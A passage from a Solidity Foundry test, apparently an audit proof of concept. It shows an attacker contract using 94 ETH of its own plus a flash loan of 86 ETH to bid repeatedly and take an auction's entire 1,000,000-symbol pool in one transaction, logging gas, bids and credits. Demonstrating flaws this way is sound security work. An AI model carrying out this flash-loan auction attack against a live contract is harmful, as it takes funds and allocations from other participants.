        assertEq(ATTACKER.balance, 0.01 ether);
    }

    /// The whole 1,000,000-symbol pool goes to one address in one transaction.
    function testWholePoolInOneTransaction() public {
        vm.prank(ATTACKER);
        F04Ladder c = new F04Ladder(auction);
        // Own capital 94 ETH; the rest of the instantaneous peak is flash-borrowed.
        vm.deal(address(c), 94 ether);

        uint256 g = gasleft();
        lender.flash(c, 86 ether, 200);
        uint256 used = g - gasleft();

        uint256 top = auction.highestBid();
        emit log_named_uint("bids in the one call", c.bids());
        emit log_named_uint("gas used by the one call", used);
        emit log_named_uint("final top bid (wei)", top);
        emit log_named_uint("ETH refunded to attacker during the ladder (wei)", c.refundsReceived());
        emit log_named_uint("attacker credits", auction.symbolCredits(address(c)));

